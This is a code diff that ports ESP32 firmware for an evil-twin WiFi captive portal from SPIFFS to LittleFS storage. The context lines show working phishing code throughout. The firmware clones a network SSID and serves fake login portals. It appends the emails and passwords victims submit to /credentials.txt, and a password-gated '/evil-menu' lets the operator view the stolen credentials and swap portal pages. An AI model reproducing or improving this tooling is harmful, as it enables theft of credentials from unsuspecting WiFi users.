@@ -1,7 +1,7 @@
 #include <WiFi.h>
 #include <WebServer.h>
 #include <DNSServer.h>
-#include <SPIFFS.h>
+#include <LittleFS.h>
 #include <FS.h>
 
 //------------------------------------------------------------------
@@ -20,11 +20,11 @@ File saveFileObject;
 bool isSaveFileAuthorized = false;
 
 //------------------------------------------------------------------
-// ── OUTILS FICHIERS SPIFFS ───────────────────────────────────────
+// ── OUTILS FICHIERS LittleFS ───────────────────────────────────────
 //------------------------------------------------------------------
 void ensureFile(const char* path, const char* content = "") {
-  if (!SPIFFS.exists(path)) {
-    File f = SPIFFS.open(path, FILE_WRITE);
+  if (!LittleFS.exists(path)) {
+    File f = LittleFS.open(path, FILE_WRITE);
     if (f) {
       f.print(content);
       f.close();
@@ -33,7 +33,7 @@ void ensureFile(const char* path, const char* content = "") {
 }
 
 void initFilesystem() {
-  if (!SPIFFS.begin(true)) {
+  if (!LittleFS.begin(true)) {
     Serial.println("[FS] mount failed");
     while (true);
   }
@@ -56,7 +56,7 @@ String htmlHeader(const char* title) {
 }
 
 void saveConfig() {
-  File f = SPIFFS.open("/config.txt", FILE_WRITE);
+  File f = LittleFS.open("/config.txt", FILE_WRITE);
   if (!f) { Serial.println("! saveConfig(): open failed"); return; }
   f.printf("SSID:%s\n", clonedSSID.c_str());
   f.printf("PWD:%s\n",  captivePortalPassword.c_str());
@@ -66,7 +66,7 @@ void saveConfig() {
 }
 
 void loadConfig() {
-  File f = SPIFFS.open("/config.txt", FILE_READ);
+  File f = LittleFS.open("/config.txt", FILE_READ);
   if (!f) { Serial.println("! loadConfig(): open failed"); return; }
 
   while (f.available()) {
@@ -91,7 +91,7 @@ void loadConfig() {
 // ── PORTAL CORE ─────────────────────────────────────────────────
 //------------------------------------------------------------------
 void saveCredentials(const String & email, const String & password, const String & portalName, const String & clonedSSID) {
-  File file = SPIFFS.open("/credentials.txt", FILE_APPEND);
+  File file = LittleFS.open("/credentials.txt", FILE_APPEND);
   if (file) {
     file.println("-- Email -- \n" + email);
     file.println("-- Password -- \n" + password);
@@ -111,12 +111,12 @@ void saveCredentials(const String & email, const String & password, const String
 
 
 void servePortalFile(const String& path) {
-  if (!SPIFFS.exists(path)) {
+  if (!LittleFS.exists(path)) {
     Serial.println("File not found: " + path);
     server.send(404,"text/plain","Portal file missing");
     return;
   }
-  File f = SPIFFS.open(path, "r");
+  File f = LittleFS.open(path, "r");
   server.streamFile(f, "text/html");
   f.close();
 }
@@ -195,7 +195,7 @@ void handleSdCardBrowse() {
   String dirPath = server.arg("dir");
   if (dirPath == "") dirPath = "/";
 
-  File dir = SPIFFS.open(dirPath);
+  File dir = LittleFS.open(dirPath);
   if (!dir || !dir.isDirectory()) {
     server.send(404, "text/html", "<html><body><p>Directory not found.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
     return;
@@ -215,8 +215,8 @@ void handleFileDownload() {
   if (!fileName.startsWith("/")) {
     fileName = "/" + fileName;
   }
-  if (SPIFFS.exists(fileName)) {
-    File file = SPIFFS.open(fileName, FILE_READ);
+  if (LittleFS.exists(fileName)) {
+    File file = LittleFS.open(fileName, FILE_READ);
     if (file) {
       String downloadName = fileName.substring(fileName.lastIndexOf('/') + 1);
       server.sendHeader("Content-Disposition", "attachment; filename=" + downloadName);
@@ -240,8 +240,8 @@ void handleFileDelete() {
   if (!fileName.startsWith("/")) {
     fileName = "/" + fileName;
   }
-  if (SPIFFS.exists(fileName)) {
-    if (SPIFFS.remove(fileName)) {
+  if (LittleFS.exists(fileName)) {
+    if (LittleFS.remove(fileName)) {
       server.send(200, "text/html", "<html><body><p>File deleted successfully</p><script>setTimeout(function(){window.location = document.referrer + '&refresh=true';}, 2000);</script></body></html>");
       Serial.println("-------------------");
       Serial.println("File deleted successfully");
@@ -267,7 +267,7 @@ void handleListDirectories() {
     return;
   }
 
-  File root = SPIFFS.open("/");
+  File root = LittleFS.open("/");
   String dirList = "";
 
   while (File file = root.openNextFile()) {
@@ -306,7 +306,7 @@ void handleFileUpload() {
 
     String fullPath = directory + filename;
 
-    fsUploadFile = SPIFFS.open(fullPath, FILE_WRITE);
+    fsUploadFile = LittleFS.open(fullPath, FILE_WRITE);
     if (!fsUploadFile) {
       Serial.println("Upload start failed: Unable to open file " + fullPath);
       server.send(500, "text/html", "File opening failed");
@@ -375,8 +375,8 @@ void handleSaveFileUpload() {
     }
 
     // Supprimer l'original s'il existe avant de sauvegarder la nouvelle version
-    if (SPIFFS.exists(saveFileName)) {
-      if (SPIFFS.remove(saveFileName)) {
+    if (LittleFS.exists(saveFileName)) {
+      if (LittleFS.remove(saveFileName)) {
         Serial.println("Original file deleted successfully: " + saveFileName);
       } else {
         Serial.println("Failed to delete original file: " + saveFileName);
@@ -386,7 +386,7 @@ void handleSaveFileUpload() {
     }
 
     // Créer un nouveau fichier pour l'écriture
-    saveFileObject = SPIFFS.open(saveFileName, FILE_WRITE);
+    saveFileObject = LittleFS.open(saveFileName, FILE_WRITE);
     if (!saveFileObject) {
       Serial.println("Failed to open file for writing: " + saveFileName);
       isSaveFileAuthorized = false;
@@ -468,8 +468,8 @@ void createCaptivePortal() {
     html += "<div class='menu'><form action='/evil-menu' method='get'>";
     html += "Password: <input type='password' name='pass'><br>";
     html += "<a href='javascript:void(0);' onclick='this.href=\"/credentials?pass=\"+document.getElementsByName(\"pass\")[0].value'>Credentials</a>";
-    html += "<a href='javascript:void(0);' onclick='this.href=\"/uploadhtmlfile?pass=\"+document.getElementsByName(\"pass\")[0].value'>Upload File On SPIFFS</a>";
-    html += "<a href='javascript:void(0);' onclick='this.href=\"/check-sd-file?pass=\"+document.getElementsByName(\"pass\")[0].value'>Check SPIFFS File</a>";
+    html += "<a href='javascript:void(0);' onclick='this.href=\"/uploadhtmlfile?pass=\"+document.getElementsByName(\"pass\")[0].value'>Upload File On LittleFS</a>";
+    html += "<a href='javascript:void(0);' onclick='this.href=\"/check-sd-file?pass=\"+document.getElementsByName(\"pass\")[0].value'>Check LittleFS File</a>";
     html += "<a href='javascript:void(0);' onclick='this.href=\"/setup-portal?pass=\"+document.getElementsByName(\"pass\")[0].value'>Setup Portal</a>";
     html += "</form></div></body></html>";
 
@@ -484,7 +484,7 @@ void createCaptivePortal() {
   server.on("/credentials", HTTP_GET, []() {
     String password = server.arg("pass");
     if (password == accessWebPassword) {
-      File file = SPIFFS.open("/credentials.txt");
+      File file = LittleFS.open("/credentials.txt");
       if (file) {
         if (file.size() == 0) {
           server.send(200, "text/html", "<html><body><p>No credentials...</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
@@ -502,7 +502,7 @@ void createCaptivePortal() {
 
 
   server.on("/check-sd-file", HTTP_GET, handleSdCardBrowse);
-  server.on("/download-SPIFFS-file", HTTP_GET, handleFileDownload);
+  server.on("/download-LittleFS-file", HTTP_GET, handleFileDownload);
   server.on("/list-directories", HTTP_GET, handleListDirectories);
 
   server.on("/uploadhtmlfile", HTTP_GET, []() {
@@ -573,7 +573,7 @@ void createCaptivePortal() {
     }
 
     String portalOptions = "";
-    File  root           = SPIFFS.open("/");
+    File  root           = LittleFS.open("/");
     int   index          = 0;
   
     while (File file = root.openNextFile()) {
@@ -701,14 +701,14 @@ void createCaptivePortal() {
     }
 
     // Check if the file exists
-    if (!SPIFFS.exists(editFileName)) {
+    if (!LittleFS.exists(editFileName)) {
       Serial.println("File not found: " + editFileName);
       server.send(404, "text/html", "<html><body><p>File not found.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
       return;
     }
 
     // Open the file for reading
-    File editFile = SPIFFS.open(editFileName, FILE_READ);
+    File editFile = LittleFS.open(editFileName, FILE_READ);
     if (!editFile) {
       Serial.println("Failed to open file for reading: " + editFileName);
       server.send(500, "text/html", "<html><body><p>Failed to open file for reading.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
